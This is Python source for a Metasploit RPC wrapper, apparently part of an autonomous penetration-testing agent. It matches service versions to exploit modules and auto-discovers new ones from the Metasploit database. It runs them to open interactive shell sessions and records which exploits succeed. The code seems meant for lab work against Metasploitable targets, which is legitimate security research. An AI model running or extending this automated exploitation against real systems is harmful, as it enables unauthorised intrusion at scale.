from pymetasploit3.msfrpc import MsfRpcClient
import yaml
import time
import subprocess
from pathlib import Path
from typing import Dict, Optional, List
from datetime import datetime

class MetasploitWrapper:
    """
    REAL-WORLD READY: Interface with Metasploit Framework via RPC.
    
    Features:
    - Manual curated mapping (starts with 5 Metasploitable 2 exploits)
    - Auto-discovery for unknown services (searches MSF database)
    - Agent learning (saves successful discoveries)
    - Confidence scoring (version matching, reliability)
    
    Learning Flow:
    Episode 1: Unknown "apache 2.4.50" → Auto-discover → Success → Save to auto_discovered
    Episode 50: "apache 2.4.50" → Found in auto_discovered → Use it (now "good" reliability)
    """
    
    def __init__(self, config_path: str = "apfa_agent/config/agent_config.yaml"):
        with open(config_path) as f:
            config = yaml.safe_load(f)
        
        msf_config = config['metasploit']
        
        if not msf_config.get('enabled', False):
            self.client = None
            return
        
        # Connect to MSF RPC
        try:
            self._connect(msf_config)
            print("✓ Connected to Metasploit RPC")
        except Exception as e:
            print(f"⚠️  Could not connect to Metasploit RPC: {e}")
            print("Attempting to start Metasploit RPC server...")
            if self._start_rpc_server(msf_config):
                 try:
                     self._connect(msf_config)
                     print("✓ Connected to Metasploit RPC (started automatically)")
                 except Exception as e2:
                     print(f"❌ Failed to connect after starting RPC server: {e2}")
                     self.client = None
            else:
                 self.client = None
        
        # Load module mappings
        self.mapping_path = Path(msf_config['module_map'])
        with open(self.mapping_path) as f:
            data = yaml.safe_load(f)
            self.module_map = {k.lower(): v for k, v in (data.get('modules') or {}).items()}
            self.auto_discovered = {k.lower(): v for k, v in (data.get('auto_discovered') or {}).items()}
        
        # Auto-discovery settings
        self.auto_discover_enabled = msf_config.get('auto_discover', True)
        self.confidence_threshold = msf_config.get('auto_discover_confidence_threshold', 0.6)
        self.auto_save = msf_config.get('auto_save_successful', True)
    
    def has_module_for(self, service_signature: str) -> bool:
        """Check if we have ANY module for this service (manual or auto-discovered)"""
        sig_lower = service_signature.lower()
        return (sig_lower in self.module_map or sig_lower in self.auto_discovered)
    
    def get_module_info(self, service_signature: str) -> Optional[Dict]:
        """
        Get module information with priority:
        1. Manual mapping (highest trust)
        2. Auto-discovered (agent learned)
        3. Auto-discover now (search MSF database)
        """
        sig_lower = service_signature.lower()
        
        # Check manual mapping first
        if sig_lower in self.module_map:
            return {**self.module_map[sig_lower], 'source': 'manual'}
        
        # Check auto-discovered
        if sig_lower in self.auto_discovered:
            return {**self.auto_discovered[sig_lower], 'source': 'auto_discovered'}
        
        # Try auto-discovery
        if self.auto_discover_enabled:
            return self.auto_discover_module(service_signature)
        
        return None
    
    def auto_discover_module(self, service_signature: str) -> Optional[Dict]:
        """
        REAL-WORLD FEATURE: Auto-discover Metasploit module for unknown service.
        
        Strategy:
        1. Extract product and version from signature
        2. Search MSF database (exact → minor → major → product)
        3. Rank results by confidence (version match + reliability)
        4. Return best match if confidence >= threshold
        
        Example:
        - Input: "apache 2.4.50"
        - Searches: ["apache 2.4.50", "apache 2.4", "apache 2", "apache"]
        - Finds: "exploit/multi/http/apache_normalize_path_rce" (CVE-2021-41773)
        - Confidence: 0.9 (exact minor version match)
        - Returns: Module info
        """
        if not self.client:
            return None
        
        try:
            # Extract product and version
            parts = service_signature.lower().split()
            product = parts[0] if parts else ""
            version = parts[1] if len(parts) > 1 else ""
            
            # Build search queries (specific → generic)
            search_queries = []
            if version:
                major_ver = version.split('.')[0]
                minor_ver = '.'.join(version.split('.')[:2]) if '.' in version else version
                search_queries = [
                    f"{product} {version}",    # "apache 2.4.50"
                    f"{product} {minor_ver}",  # "apache 2.4"
                    f"{product} {major_ver}",  # "apache 2"
                    product                     # "apache"
                ]
            else:
                search_queries = [product]
            
            # Search MSF database
            all_results = []
            for query in search_queries:
                try:
                    results = self.client.modules.search(query)
                    # Filter for exploits only
                    exploits = [r for r in results if 'exploit/' in r.get('fullname', '')]
                    all_results.extend(exploits)
                except:
                    continue
            
            if not all_results:
                print(f"⚠️  No MSF modules found for: {service_signature}")
                return None
            
            # Rank results
            best_match = self._rank_exploits(all_results, service_signature, version)
            
            if best_match['confidence'] >= self.confidence_threshold:
                print(f"🔍 Auto-discovered: {best_match['module']} "
                      f"(confidence: {best_match['confidence']:.2f})")
                return best_match
            else:
                print(f"⚠️  Low confidence: {best_match['confidence']:.2f} < {self.confidence_threshold}")
                return None
        
        except Exception as e:
            print(f"⚠️  Auto-discovery failed: {e}")
            return None
    
    def _rank_exploits(self, exploits: List[Dict], service_sig: str, version: str) -> Dict:
        """
        Rank exploit modules by confidence.
        
        Scoring:
        - Exact version in name: +0.4
        - Major version in name: +0.3
        - Product name in name: +0.2
        - Top 10 result: +0.1
        """
        scored = []
        
        for i, exploit in enumerate(exploits):
            score = 0.0
            name = exploit.get('fullname', '').lower()
            
            # Version matching
            if version:
                if version in name:
                    score += 0.4
                elif version.split('.')[0] in name:
                    score += 0.3
            
            # Product matching
            product = service_sig.split()[0].lower()
            if product in name:
                score += 0.2
            
            # Ranking bonus (earlier = more relevant)
            if i < 10:
                score += 0.1
            
            scored.append({
                'module': exploit['fullname'],
                'confidence': min(score, 1.0),
                'rank': i,
                'discovered': True
            })
        
        return max(scored, key=lambda x: x['confidence'])
    
    def save_successful_module(
        self, 
        service_signature: str, 
        module: str, 
        success: bool
    ):
        """
        LEARNING SYSTEM: Save successful auto-discovered exploits.
        
        Reliability progression:
        - 1 success: "unverified"
        - 3 successes: "testing"
        - 5 successes: "good"
        - 10 successes: "excellent"
        """
        if not self.auto_save:
            return
        
        sig_lower = service_signature.lower()
        
        # Load current YAML
        with open(self.mapping_path) as f:
            data = yaml.safe_load(f)
        
        if 'auto_discovered' not in data:
            data['auto_discovered'] = {}
        
        # Add or update
        if sig_lower not in data['auto_discovered']:
            data['auto_discovered'][sig_lower] = {
                'module': module,
                'discovered_date': datetime.now().isoformat(),
                'success_count': 0,
                'fail_count': 0,
                'reliability': 'unverified',
                'confidence': 0.0
            }
        
        entry = data['auto_discovered'][sig_lower]
        
        if success:
            entry['success_count'] += 1
        else:
            entry['fail_count'] += 1
        
        # Update reliability
        successes = entry['success_count']
        if successes >= 10:
            entry['reliability'] = 'excellent'
        elif successes >= 5:
            entry['reliability'] = 'good'
        elif successes >= 3:
            entry['reliability'] = 'testing'
        else:
            entry['reliability'] = 'unverified'
        
        # Save back to YAML
        with open(self.mapping_path, 'w') as f:
            yaml.dump(data, f, default_flow_style=False, sort_keys=False)
        
        print(f"💾 Saved module: {service_signature} → {module} "
              f"({entry['success_count']} successes, reliability: {entry['reliability']})")
    
    def run_exploit(self, module_path: str, options: Dict) -> Dict:
        """
        Execute a Metasploit module.
        """
        if not self.client:
            return {'success': False, 'error': 'Metasploit not connected'}
            
        try:
            exploit = self.client.modules.use('exploit', module_path)
            
            # Set options
            for key, value in options.items():
                if key in exploit.options:
                    exploit[key] = value
            
            # Execute
            print(f"🚀 Executing MSF module: {module_path}")
            job = exploit.execute(payload='cmd/unix/interact')
            
            # Wait for result (simplified for now)
            # In a real scenario, we'd poll the job status and session list
            
            # Check for sessions
            sessions = self.client.sessions.list
            if sessions:
                # Assuming the last session is ours
                session_id = list(sessions.keys())[-1]
                print(f"✅ Session opened: {session_id}")
                return {'success': True, 'session_id': session_id, 'output': 'Session opened'}
            else:
                return {'success': False, 'error': 'No session created'}
                
        except Exception as e:
            print(f"❌ MSF execution failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def _connect(self, msf_config):
        """Helper to establish connection"""
        self.client = MsfRpcClient(
            msf_config['password'],
            server=msf_config['rpc_host'],
            port=msf_config['rpc_port'],
            ssl=msf_config['rpc_ssl']
        )

    def _start_rpc_server(self, msf_config) -> bool:
        """Attempt to start msfrpcd"""
        try:
            cmd = [
                "msfrpcd",
                "-U", msf_config['username'],
                "-P", msf_config['password'],
                "-p", str(msf_config['rpc_port']),
                "-S", # Disable SSL for local if configured that way, but config has ssl option. 
                      # The config has 'rpc_ssl', if false we should probably use -S.
                "-a", msf_config['rpc_host']
            ]
            
            # Adjust SSL flag based on config
            if msf_config.get('rpc_ssl', False):
                # Remove -S if it was added, or just don't add it. 
                # msfrpcd defaults to SSL enabled. -S disables it.
                cmd.remove("-S")
            
            print(f"[*] Starting Metasploit RPC: {' '.join(cmd)}")
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for it to initialize
            print("[*] Waiting 15s for Metasploit to initialize...")
            time.sleep(15)
            return True
        except Exception as e:
            print(f"❌ Failed to start msfrpcd: {e}")
            return False
